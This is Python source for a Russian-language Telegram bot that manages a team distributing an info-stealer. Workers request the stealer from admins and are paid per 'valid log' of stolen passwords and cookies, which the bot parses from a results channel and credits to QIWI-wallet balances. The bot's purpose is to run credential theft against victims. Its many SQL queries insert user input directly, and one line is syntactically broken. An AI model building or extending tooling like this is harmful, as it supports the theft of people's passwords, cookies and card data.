# -*- coding: utf8 -*-
import config
import telebot
import sqlite3
import string
import random
import SimpleQIWI
from SimpleQIWI import *
from telebot import types
import datetime
from datetime import *

buttons_start = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
profile = types.KeyboardButton("🧑‍💻 Профиль")
settings = types.KeyboardButton("⚙️ Информация")
request = types.KeyboardButton("🦠 Запросить стиллер")
buttons_start.row(profile, settings)
buttons_start.row(request)

buttoninline_setting = types.InlineKeyboardMarkup()
chatlink = types.InlineKeyboardButton(text='💌 Чат воркеров', url=config.chatlink)
profitlink = types.InlineKeyboardButton(text='💗 Выплаты', url=config.profitlink)
manuallink = types.InlineKeyboardButton(text='📚 Мануалы', url=config.manuallink)
otstuklink = types.InlineKeyboardButton(text='🛠 Отстук', url=config.otstuklink)
rules = types.InlineKeyboardButton(text='📜 Правила', callback_data='rules')
buttoninline_setting.row(chatlink, profitlink)
buttoninline_setting.row(manuallink, otstuklink)
buttoninline_setting.row(rules)

paymantagree = types.InlineKeyboardMarkup()
paymentsuccess = types.InlineKeyboardButton(text='Выплачено', callback_data='paymentsuccess')
paymantagree.row(paymentsuccess)

buttoninline = types.InlineKeyboardMarkup()
changepayment = types.InlineKeyboardButton(text='💳 Изменить способ вывода', callback_data='changepayment')
withd = types.InlineKeyboardButton(text='🤑 Вывести', callback_data='withd')
changetag = types.InlineKeyboardButton(text='🥽 Изменить Тэг', callback_data='changetag')
changelogin = types.InlineKeyboardButton(text='💾 Изменить логин', callback_data='changelogin')
delinfo = types.InlineKeyboardButton(text='🗑 Очистить статистику', callback_data='delinfo')
buttoninline.row(changepayment)
buttoninline.row(changetag, changelogin)
buttoninline.row(withd)
buttoninline.row(delinfo)

buttoninline_del = types.InlineKeyboardMarkup()
agreedel = types.InlineKeyboardButton(text='Я уверен', callback_data='agreedel')
declinedel = types.InlineKeyboardButton(text='Отмена', callback_data='declinedel')
buttoninline_del.row(agreedel, declinedel)

bot = telebot.TeleBot(config.token, parse_mode=None)
print('Бот включен! '+str(datetime.now()))

api = QApi(token=config.qiwitoken, phone=config.qiwiphone)
print('Qiwi Подключено! '+str(datetime.now()))

db = sqlite3.connect('E:/collectorteam/database.db', check_same_thread=False)
sql = db.cursor()
print('База данных подключена! '+str(datetime.now()))

sql.execute("""CREATE TABLE IF NOT EXISTS users (
	id INT PRIMARY KEY,
	login TEXT,
	tag TEXT,
	fname TEXT,
	balance INT,
	allprofit INT,
	alllogs INT,
	datereg TEXT,
	payment TEXT,
	status INT
)""")

@bot.message_handler(commands=['start'])
def send_welcome(message):
	try:
		sql = db.cursor()
		sql.execute(f"SELECT id FROM users WHERE id = 'message.chat.id'")
		if sql.fetchone() is None:
			letters = string.ascii_uppercase + string.digits
			rand_string = ''.join(random.choice(letters) for i in range(10))
			dt_now = str(datetime.today().strftime('%d.%m.%Y'))
			sql.execute(f"INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", (message.chat.id, message.from_user.username, rand_string, message.from_user.first_name, 0, 0, 0, dt_now, 'Тут ничего нет :(', 0))
			db.commit()
			bot.send_sticker(message.chat.id,'CAACAgEAAxkBAAEBbzVgxcr_bAyEQKGyiMbfd-OoaZV4GAACIwkAAuN4BAABn1mg9roZ0DkfBA', reply_markup=buttons_start)
			bot.send_message(message.chat.id,'Добро пожаловать в команду https://t.me/kittyspig <b>'+config.team+'</b>!\nИспользуй кнопки ниже для навигации в боте.', parse_mode='HTML', reply_markup=buttons_start)
	except:
		pass
@bot.message_handler(commands=['payoff'])
def send_payoff(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			workeridd = message.text[message.text.find(' '):]
			bot.send_message(int(workeridd), '<b>🥳 Выплату отправили!\nСпасибо что работаешь именно с нами https://t.me/kittyspig.</b>', parse_mode='HTML')
			bot.send_message(message.chat.id,'Сообщение отправлено воркеру!')
		else:
			pass
	except:
		pass
@bot.channel_post_handler(content_types=['text','photo','audio','video','document'])
def posts_from_channels(message):
	if True:
		messtext = str(message.text).split('\n')
		first_text = messtext[0].split()
		print(first_text)
		if first_text[0] == '_________________________' and str(message.chat.id) == config.otstuklinkid:
			autofills = messtext[10].split(' ')
			passwords = messtext[11].split(' ')
			cookies = messtext[12].split(' ')
			cards = messtext[13].split(' ')
			print('Pass: '+passwords[2]+'\nCookies: '+cookies[2])
			if int(passwords[2]) >= 10 and int(cookies[2]) >= 300:
				kogoLog = messtext[5].split(' ')
				kogoLog = kogoLog[2]
				kogoLog = str(kogoLog).replace("@", "")
				print(kogoLog)
				sql.execute(f"UPDATE users SET balance=balance+'{config.price}' WHERE login='{kogoLog}'")
				sql.execute(f"UPDATE users SET allprofit=allprofit+'{config.price}' WHERE login ='{kogoLog}'")
				sql.execute(f"UPDATE users SET alllogs=alllogs+1 WHERE login='{kogoLog}'")
				db.commit()
				sql.execute(f"SELECT balance FROM users WHERE login='{kogoLog}'")
				balancework = sql.fetchall()
				sql.execute(f"SELECT id FROM users WHERE login='{kogoLog}'")
				workerid = sql.fetchall()
				bot.send_message(int(workerid[0][0]),'<b>💞 Прилетел валидный Лог!\nPasswords: '+str(passwords[2])+'\nCookies: '+str(cookies[2])+'\nБаланс: '+str(balancework[0][0])+' RUB</b>', parse_mode='HTML')
@bot.message_handler(commands=['seestat'])
def send_seestat(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				worker = message.text[message.text.find(' '):]
				sql.execute(f"SELECT login FROM users WHERE id='{int(worker)}'")
				profilelogin = sql.fetchall()
				sql.execute(f"SELECT tag FROM users WHERE id='{int(worker)}'")
				tagprofile = sql.fetchall()
				sql.execute(f"SELECT balance FROM users WHERE id='{int(worker)}'")
				balanceprofile = sql.fetchall()
				sql.execute(f"SELECT allprofit FROM users WHERE id='{int(worker)}'")
				allprofiteprofile = sql.fetchall()
				sql.execute(f"SELECT datereg FROM users WHERE id='{int(worker)}'")
				dateregprofile = sql.fetchall()
				sql.execute(f"SELECT fname FROM users WHERE id='{int(worker)}'")
				fnameprofile = sql.fetchall()
				sql.execute(f"SELECT payment FROM users WHERE id='{int(worker)}'")
				paymentprofile = sql.fetchall()
				sql.execute(f"SELECT alllogs FROM users WHERE id='{int(worker)}'")
				alllogs = sql.fetchall()
				bot.send_message(message.chat.id,'*🧑‍💻 Профиль*\n\n📌 Ваш тэг: #'+str(tagprofile[0][0])+'\n💾 Логин в БД: *@'+str(profilelogin[0][0])+'*\n📉 Ставка за лог: *'+str(config.price)+' RUB*\n\n💸 Баланс: *'+str(balanceprofile[0][0])+' RUB*\n📊 Всего заработанно: *'+str(allprofiteprofile[0][0])+' RUB*\n💉 Всего логов: *'+str(alllogs[0][0])+'*\n💰 Кошелек для выплат: *'+str(paymentprofile[0][0])+'*\n\n📆 Ты с нами с: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown')
			except:
				pass
	except:
		pass
@bot.message_handler(commands=['qiwibalance'])
def send_qiwibalance(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				balance = api.balance
				bot.send_message(message.chat.id,'🥝 Баланс QIWI кошелька: *'+str(balance[0])+' RUB*', parse_mode='Markdown')
			except:
				pass
		else:
			pass
	except:
		pass
@bot.message_handler(commands=['advert'])
def send_advert(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			textmessage = message.text[message.text.find(' '):]
			sql.execute(f"SELECT * FROM users")
			records = sql.fetchall()
			amountsend = 0
			amounterror = 0
			for row in records:
				try:
					bot.send_message(row[0], textmessage, parse_mode='HTML')
					amountsend = amountsend+1
				except:
					amounterror = amounterror+1
			bot.send_message(message.chat.id,'✅ Рассылка завершена!\nСообщение получило: <b>'+str(amountsend)+' юзера</b>\nНе получило: <b>'+str(amounterror)+' юзера</b>', parse_mode='HTML')
		else:
			pass
	except:
		pass
@bot.message_handler(commands=['setstatus'])
def send_setstatus(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				iduser = message.text[message.text.find(' '):]
				iduser = iduser.rpartition(':')[0]  
				idstatus = message.text[message.text.find(':'):]
				idstatus = idstatus.replace(':','')
				sql.execute(f"UPDATE users SET status={idstatus} WHERE id={iduser}")
				db.commit()
				bot.send_message(message.chat.id,'Статус пользователя изменён!')
				if int(idstatus) == 0:
					stat = '⛏ Воркер'
				elif int(idstatus) == 1:
					stat = '🔴 Администратор'
				elif int(idstatus) == 2:
					stat = '🕺 Саппорт'
				elif int(idstatus) == 3:
					stat = '⛔️ Заблокирован'
				bot.send_message(int(iduser),'<b>⚠️ Ваш статус изменён! ⚠️</b>\n\nВаш новый статус: <b>'+stat+'</b>', parse_mode='HTML')
			except:
				pass
	except:
		pass
@bot.message_handler(commands=['discard'])
def send_sendmessage(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				worker = message.text[message.text.find(' '):]
				worker = worker.rpartition(':')[0]  
				amount = message.text[message.text.find(':'):]
				amount = amount.replace(':','')
				sql.execute(f"SELECT balance FROM users WHERE id='{worker}'")
				beforebalance = sql.fetchall()[0][0]
				afterbalance = int(beforebalance)-int(amount)
				sql.execute(f"UPDATE users SET balance={afterbalance} WHERE id={worker}")
				db.commit()
				afterbalance = int(beforebalance)-int(amount)
				bot.send_message(message.chat.id,'💳 Успешное списание.\nБаланс до *'+str(beforebalance)+' RUB*, после *'+str(afterbalance)+' RUB*', parse_mode='Markdown')
				bot.send_message(int(worker),'❌ У вас с баланса списали *'+amount+' RUB*. Ваш баланс: *'+str(afterbalance)+' RUB*', parse_mode='Markdown')
			except:
				pass
	except:
		pass
@bot.message_handler(commands=['sendmessage'])
def send_sendmessage(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				iduser = message.text[message.text.find(' '):]
				iduser = iduser.rpartition(':')[0]  
				textmessage = message.text[message.text.find(':'):]
				textmessage = textmessage.replace(':','')
				bot.send_message(int(iduser),textmessage, parse_mode='HTML')
				bot.send_message(message.chat.id,'Сообщение успешно отправлено!')
			except:
				pass
	except:
		pass
@bot.message_handler(commands=['qiwisendmoney'])
def send_qiwibalance(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			try:
				wherepayment = message.text[message.text.find(' '):]
				wherepayment = wherepayment.rpartition(':')[0]  
				amount = message.text[message.text.find(':'):]
				amount = amount.replace(':','')
				bot.send_message(message.chat.id,'<b>♻️ Отправляю выплату..</b>\n\n🧑‍💻 Получатель: <b>'+wherepayment+'</b>\n💸 Сумма: <b>'+amount+' RUB</b>\n⛈ Коментарий: <b>'++'</b>', parse_mode='HTML')
				api.pay(account=wherepayment, amount=amount, comment=config.team)
				bot.send_message(message.chat.id,'Выплата отправлена!\n\n/payoff [ID WORKER]')
			except:
				bot.send_message(message.chat.id,'Ошибка при отправке!\nПроверить баланс - /qiwibalance')
	except:
		pass
@bot.message_handler(commands=['admin'])
def send_admin(message):
	try:
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		if sql.fetchall()[0][0] == 1:
			bot.send_message(message.chat.id,'<b>😏 Admin-Panel\n\n/discard [ID]:[AMOUNT] - списать деньги с балика у воркера\n/seestat [ID] - посмотреть статистику воркера\n/advert [TEXT] (теги: https://telegra.ph/HTML-Tags-06-26)\n/sendmessage [ID WORKER]:[TEXT] - Отправка сообщения воркерку (теги: https://telegra.ph/HTML-Tags-06-26)\n/setstatus [ID WORKER]:[ID STATUS]- Изменить статус юзера (ид статусов: 0 - воркер, 1 - Админ, 2 - Саппорт, 3 - Заблокирован)\n/qiwibalance - Показывает баланс киви кошелька для выплат\n/qiwisendmoney [QIWI WORKER]:[AMOUNT] - Отправляет деньги на кошелек воркера\n/payoff [ID WORKER] - Отправить сообщение воркеру об высланной выплате</b>', parse_mode='HTML')
		else:
			pass
	except:
		pass
@bot.message_handler(content_types=['text'])
def message(message):
	if message.text == '🧑‍💻 Профиль':
		sql.execute(f"SELECT login FROM users WHERE id='{message.chat.id}'")
		profilelogin = sql.fetchall()
		sql.execute(f"SELECT tag FROM users WHERE id='{message.chat.id}'")
		tagprofile = sql.fetchall()
		sql.execute(f"SELECT balance FROM users WHERE id='{message.chat.id}'")
		balanceprofile = sql.fetchall()
		sql.execute(f"SELECT allprofit FROM users WHERE id='{message.chat.id}'")
		allprofiteprofile = sql.fetchall()
		sql.execute(f"SELECT datereg FROM users WHERE id='{message.chat.id}'")
		dateregprofile = sql.fetchall()
		sql.execute(f"SELECT fname FROM users WHERE id='{message.chat.id}'")
		fnameprofile = sql.fetchall()
		sql.execute(f"SELECT payment FROM users WHERE id='{message.chat.id}'")
		paymentprofile = sql.fetchall()
		sql.execute(f"SELECT alllogs FROM users WHERE id='{message.chat.id}'")
		alllogs = sql.fetchall()
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		st = sql.fetchall()[0][0]
		if st == 0:
			statusprofile = 'Воркер'
		elif st == 1:
			statusprofile = 'Администратор'
		elif st == 2:
			statusprofile = 'Саппорт'
		elif st == 3:
			statusprofile = 'Заблокирован'
		bot.send_message(message.chat.id,'👮‍♂️ С возвращением, *'+str(fnameprofile[0][0])+'* \n\n*🧑‍💻 Профиль*\n\n📌 Ваш тэг: #'+str(tagprofile[0][0])+'\n💾 Логин в БД: *@'+str(profilelogin[0][0])+'*\n📉 Ставка за лог: *'+str(config.price)+' RUB*\n\n💸 Баланс: *'+str(balanceprofile[0][0])+' RUB*\n📊 Всего заработанно: *'+str(allprofiteprofile[0][0])+' RUB*\n💉 Всего логов: *'+str(alllogs[0][0])+'*\n💰 Кошелек для выплат: *'+str(paymentprofile[0][0])+'*\n\n👤 Статус: *'+statusprofile+'*\n📆 Ты с нами с: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown', reply_markup=buttoninline)
	elif message.text == '⚙️ Информация':
		bot.send_message(message.chat.id,'<b>⚙️ Информация</b>', parse_mode='HTML', reply_markup=buttoninline_setting)
	elif message.text == '🦠 Запросить стиллер':
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		st = sql.fetchall()[0][0]
		if st == 3:
			bot.send_message(message.chat.id,'⚠️ <b>Доступ запрещён</b> ⚠️', parse_mode='HTML')
		else:
			try:
				bot.send_message(message.chat.id,'🧠 Запрос отправлен администрации. Ожидайте с вами свяжутся.')
				sql.execute(f"SELECT tag FROM users WHERE id='{message.chat.id}'")
				tagworkerr = sql.fetchall()[0][0]
				bot.send_message(config.amschatid,'<b>Эй, хватит отдыхать 🏖\nНужен стиллер!</b>\n\n📌 Тэг: #'+str(tagworkerr)+'\n🆔 ID: <b>'+str(message.chat.id)+'</b>\n🧑‍💻 Воркер: @'+str(message.from_user.username)+' / '+str(message.chat.id), parse_mode='HTML')
			except:
				pass
def changetagdef(message):
	newtag = message.text
	if len(newtag) > 10:
		bot.send_message(message.chat.id,'*🙅‍♀️ Вы ввели тэг больше 10 символов. Попробуй ещё раз.*', parse_mode='Markdown')
		return
	else:
		try:
			sql.execute(f"UPDATE users SET tag='{newtag}' WHERE id='{message.chat.id}'")
			db.commit()
			bot.send_message(message.chat.id,'🎉')
			sql.execute(f"SELECT login FROM users WHERE id='{message.chat.id}'")
			profilelogin = sql.fetchall()
			sql.execute(f"SELECT tag FROM users WHERE id='{message.chat.id}'")
			tagprofile = sql.fetchall()
			sql.execute(f"SELECT balance FROM users WHERE id='{message.chat.id}'")
			balanceprofile = sql.fetchall()
			sql.execute(f"SELECT allprofit FROM users WHERE id='{message.chat.id}'")
			allprofiteprofile = sql.fetchall()
			sql.execute(f"SELECT datereg FROM users WHERE id='{message.chat.id}'")
			dateregprofile = sql.fetchall()
			sql.execute(f"SELECT fname FROM users WHERE id='{message.chat.id}'")
			fnameprofile = sql.fetchall()
			sql.execute(f"SELECT payment FROM users WHERE id='{message.chat.id}'")
			paymentprofile = sql.fetchall()
			sql.execute(f"SELECT alllogs FROM users WHERE id='{message.chat.id}'")
			alllogs = sql.fetchall()
			sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
			st = sql.fetchall()[0][0]
			if st == 0:
				statusprofile = 'Воркер'
			elif st == 1:
				statusprofile = 'Администратор'
			elif st == 2:
				statusprofile = 'Саппорт'
			elif st == 3:
				statusprofile = 'Заблокирован'
			bot.send_message(message.chat.id,'👮‍♂️ С возвращением, *'+str(fnameprofile[0][0])+'* \n\n*🧑‍💻 Профиль*\n\n📌 Ваш тэг: #'+str(tagprofile[0][0])+'\n💾 Логин в БД: *@'+str(profilelogin[0][0])+'*\n📉 Ставка за лог: *'+str(config.price)+' RUB*\n\n💸 Баланс: *'+str(balanceprofile[0][0])+' RUB*\n📊 Всего заработанно: *'+str(allprofiteprofile[0][0])+' RUB*\n💉 Всего логов: *'+str(alllogs[0][0])+'*\n💰 Кошелек для выплат: *'+str(paymentprofile[0][0])+'*\n\n👤 Статус: *'+statusprofile+'*\n📆 Ты с нами с: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown', reply_markup=buttoninline)
		except:
			pass
def changepaymentdef(message):
	paymentchange = message.text
	try:
		sql.execute(f"UPDATE users SET payment='{paymentchange}' WHERE id='{message.chat.id}'")
		db.commit()
		sql.execute(f"SELECT payment FROM users WHERE id='{message.chat.id}'")
		paymentprofile = sql.fetchall()
		bot.send_message(message.chat.id,'🎉')
		sql.execute(f"SELECT login FROM users WHERE id='{message.chat.id}'")
		profilelogin = sql.fetchall()
		sql.execute(f"SELECT tag FROM users WHERE id='{message.chat.id}'")
		tagprofile = sql.fetchall()
		sql.execute(f"SELECT balance FROM users WHERE id='{message.chat.id}'")
		balanceprofile = sql.fetchall()
		sql.execute(f"SELECT allprofit FROM users WHERE id='{message.chat.id}'")
		allprofiteprofile = sql.fetchall()
		sql.execute(f"SELECT datereg FROM users WHERE id='{message.chat.id}'")
		dateregprofile = sql.fetchall()
		sql.execute(f"SELECT fname FROM users WHERE id='{message.chat.id}'")
		fnameprofile = sql.fetchall()
		sql.execute(f"SELECT payment FROM users WHERE id='{message.chat.id}'")
		paymentprofile = sql.fetchall()
		sql.execute(f"SELECT alllogs FROM users WHERE id='{message.chat.id}'")
		alllogs = sql.fetchall()
		sql.execute(f"SELECT status FROM users WHERE id='{message.chat.id}'")
		st = sql.fetchall()[0][0]
		if st == 0:
			statusprofile = 'Воркер'
		elif st == 1:
			statusprofile = 'Администратор'
		elif st == 2:
			statusprofile = 'Саппорт'
		elif st == 3:
			statusprofile = 'Заблокирован'
		bot.send_message(message.chat.id,'👮‍♂️ С возвращением, *'+str(fnameprofile[0][0])+'* \n\n*🧑‍💻 Профиль*\n\n📌 Ваш тэг: #'+str(tagprofile[0][0])+'\n💾 Логин в БД: *@'+str(profilelogin[0][0])+'*\n📉 Ставка за лог: *'+str(config.price)+' RUB*\n\n💸 Баланс: *'+str(balanceprofile[0][0])+' RUB*\n📊 Всего заработанно: *'+str(allprofiteprofile[0][0])+' RUB*\n💉 Всего логов: *'+str(alllogs[0][0])+'*\n💰 Кошелек для выплат: *'+str(paymentprofile[0][0])+'*\n\n👤 Статус: *'+statusprofile+'*\n📆 Ты с нами с: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown', reply_markup=buttoninline)
	except:
		pass
@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
	if call.data == 'changelogin':
		try:
			sql.execute(f"UPDATE users SET login='{call.message.chat.username}' WHERE id={call.message.chat.id}")
			db.commit()
			bot.send_message(call.message.chat.id, 'Ваш логин успешно изменён.')
		except:
			pass
	if call.data == 'declinedel':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		try:
			sql.execute(f"SELECT login FROM users WHERE id='{call.message.chat.id}'")
			profilelogin = sql.fetchall()
			sql.execute(f"SELECT tag FROM users WHERE id='{call.message.chat.id}'")
			tagprofile = sql.fetchall()
			sql.execute(f"SELECT balance FROM users WHERE id='{call.message.chat.id}'")
			balanceprofile = sql.fetchall()
			sql.execute(f"SELECT allprofit FROM users WHERE id='{call.message.chat.id}'")
			allprofiteprofile = sql.fetchall()
			sql.execute(f"SELECT datereg FROM users WHERE id='{call.message.chat.id}'")
			dateregprofile = sql.fetchall()
			sql.execute(f"SELECT fname FROM users WHERE id='{call.message.chat.id}'")
			fnameprofile = sql.fetchall()
			sql.execute(f"SELECT payment FROM users WHERE id='{call.message.chat.id}'")
			paymentprofile = sql.fetchall()
			sql.execute(f"SELECT alllogs FROM users WHERE id='{call.message.chat.id}'")
			alllogs = sql.fetchall()
			sql.execute(f"SELECT status FROM users WHERE id='{call.message.chat.id}'")
			st = sql.fetchall()[0][0]
			if st == 0:
				statusprofile = 'Воркер'
			elif st == 1:
				statusprofile = 'Администратор'
			elif st == 2:
				statusprofile = 'Саппорт'
			elif st == 3:
				statusprofile = 'Заблокирован'
			bot.send_message(call.message.chat.id,'👮‍♂️ С возвращением, *'+str(fnameprofile[0][0])+'* \n\n*🧑‍💻 Профиль*\n\n📌 Ваш тэг: #'+str(tagprofile[0][0])+'\n💾 Логин в БД: *@'+str(profilelogin[0][0])+'*\n📉 Ставка за лог: *'+str(config.price)+' RUB*\n\n💸 Баланс: *'+str(balanceprofile[0][0])+' RUB*\n📊 Всего заработанно: *'+str(allprofiteprofile[0][0])+' RUB*\n💉 Всего логов: *'+str(alllogs[0][0])+'*\n💰 Кошелек для выплат: *'+str(paymentprofile[0][0])+'*\n\n👤 Статус: *'+statusprofile+'*\n📆 Ты с нами с: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown', reply_markup=buttoninline)
		except:
				pass
	if call.data == 'delinfo':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		bot.send_message(call.message.chat.id,'<b>⚠️ Вы уверены? ⚠️</b>\nУдалится: <b>Всего заработанно, Всего логов.</b>', parse_mode='HTML', reply_markup=buttoninline_del)
	if call.data == 'agreedel':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		sql.execute(f"UPDATE users SET allprofit=0 WHERE id='{call.message.chat.id}'")
		sql.execute(f"UPDATE users SET alllogs=0 WHERE id='{call.message.chat.id}'")
		db.commit()
		bot.send_message(call.message.chat.id,'🎉')
		try:
			sql.execute(f"SELECT login FROM users WHERE id='{call.message.chat.id}'")
			profilelogin = sql.fetchall()
			sql.execute(f"SELECT tag FROM users WHERE id='{call.message.chat.id}'")
			tagprofile = sql.fetchall()
			sql.execute(f"SELECT balance FROM users WHERE id='{call.message.chat.id}'")
			balanceprofile = sql.fetchall()
			sql.execute(f"SELECT allprofit FROM users WHERE id='{call.message.chat.id}'")
			allprofiteprofile = sql.fetchall()
			sql.execute(f"SELECT datereg FROM users WHERE id='{call.message.chat.id}'")
			dateregprofile = sql.fetchall()
			sql.execute(f"SELECT fname FROM users WHERE id='{call.message.chat.id}'")
			fnameprofile = sql.fetchall()
			sql.execute(f"SELECT payment FROM users WHERE id='{call.message.chat.id}'")
			paymentprofile = sql.fetchall()
			sql.execute(f"SELECT alllogs FROM users WHERE id='{call.message.chat.id}'")
			alllogs = sql.fetchall()
			sql.execute(f"SELECT status FROM users WHERE id='{call.message.chat.id}'")
			st = sql.fetchall()[0][0]
			if st == 0:
				statusprofile = 'Воркер'
			elif st == 1:
				statusprofile = 'Администратор'
			elif st == 2:
				statusprofile = 'Саппорт'
			elif st == 3:
				statusprofile = 'Заблокирован'
			bot.send_message(call.message.chat.id,'👮‍♂️ С возвращением, *'+str(fnameprofile[0][0])+'* \n\n*🧑‍💻 Профиль*\n\n📌 Ваш тэг: #'+str(tagprofile[0][0])+'\n💾 Логин в БД: *@'+str(profilelogin[0][0])+'*\n📉 Ставка за лог: *'+str(config.price)+' RUB*\n\n💸 Баланс: *'+str(balanceprofile[0][0])+' RUB*\n📊 Всего заработанно: *'+str(allprofiteprofile[0][0])+' RUB*\n💉 Всего логов: *'+str(alllogs[0][0])+'*\n💰 Кошелек для выплат: *'+str(paymentprofile[0][0])+'*\n\n👤 Статус: *'+statusprofile+'*\n📆 Ты с нами с: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown', reply_markup=buttoninline)
		except:
			pass
	if call.data == 'rules':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		bot.send_message(call.message.chat.id,config.rulestext, parse_mode='HTML')
	if call.data == 'changetag':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		a = bot.send_message(call.message.chat.id,'*Введите ваш новый Тэг 👇*', parse_mode='Markdown')
		bot.register_next_step_handler(a, changetagdef)
	if call.data == 'withd':
		sql.execute(f"SELECT status FROM users WHERE id='{call.message.chat.id}'")
		st = sql.fetchall()[0][0]
		if st == 3:
			bot.send_message(call.message.chat.id,'⚠️ <b>Вывод запрещён!</b> ⚠️', parse_mode='HTML')
			pass
		else:
			sql.execute(f"SELECT balance FROM users WHERE id='{call.message.chat.id}'")
			balik = sql.fetchall()
			sql.execute(f"SELECT payment FROM users WHERE id='{call.message.chat.id}'")
			payment = sql.fetchall()[0][0]
			if balik[0][0] < config.minwith:
				bot.send_message(call.message.chat.id,'‼️ Вывод не возможен. На балансе меньше минимальной суммы вывода. Вывод от *'+str(config.minwith)+' RUB* ‼️', parse_mode='Markdown')
				return
			if payment == 'Тут ничего нет :(':
				bot.send_message(call.message.chat.id,'‼️ Вывод не возможен. Не указан способ вывода ‼️', parse_mode='Markdown')
				return
			else:
				sql.execute(f"SELECT balance FROM users WHERE id='{call.message.chat.id}'")
				balanceworker = sql.fetchall()
				sql.execute(f"UPDATE users SET balance=balance-balance WHERE id='{call.message.chat.id}'")
				db.commit()
				sql.execute(f"SELECT payment FROM users WHERE id='{call.message.chat.id}'")
				paymentprofile = sql.fetchall()
				bot.send_message(call.message.chat.id,'✅ Заявка на вывод *'+str(balanceworker[0][0])+' RUB* успешно создана!\n💰 Кошелек для выплат: *'+str(paymentprofile[0][0])+'*', parse_mode='Markdown')
				sql.execute(f"SELECT tag FROM users WHERE id='{call.message.chat.id}'")
				tagprofile = sql.fetchall()
				sql.execute(f"SELECT tag FROM users WHERE id='{call.message.chat.id}'")
				tagworker = sql.fetchall()
				bot.send_message(config.amschatid, 'Эй, хватит курить 🚬\nСоздана заявка на вывод\n\n🧑‍💻 Воркер: #'+str(tagworker[0][0])+'\n🆔 ID: <b>'+str(call.message.chat.id)+'</b>\n📊 Сумма выплаты: <b>'+str(balanceworker[0][0])+' RUB</b>\n💰 Кошелек для вылаты: <b>'+str(paymentprofile[0][0])+'</b>\n\n/qiwisendmoney '+str(paymentprofile[0][0])+':'+str(balanceworker[0][0])+'', parse_mode='HTML')
				bot.send_message(config.profitlinkid, '💞 Заявка на вывод\n💸 Сумма заявки: <b>'+str(balanceworker[0][0])+' RUB</b>\n\n🧑‍💻 Воркер: #'+str(tagworker[0][0])+'\n⚙️ Статус: ВЫПЛАЧЕНО', parse_mode='HTML')
	if call.data == 'changepayment':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		a = bot.send_message(call.message.chat.id,'*Введите номер кошелька для выплаты 👇*', parse_mode='Markdown')
		bot.register_next_step_handler(a, changepaymentdef)
if __name__ == '__main__':
	bot.polling(none_stop=True) 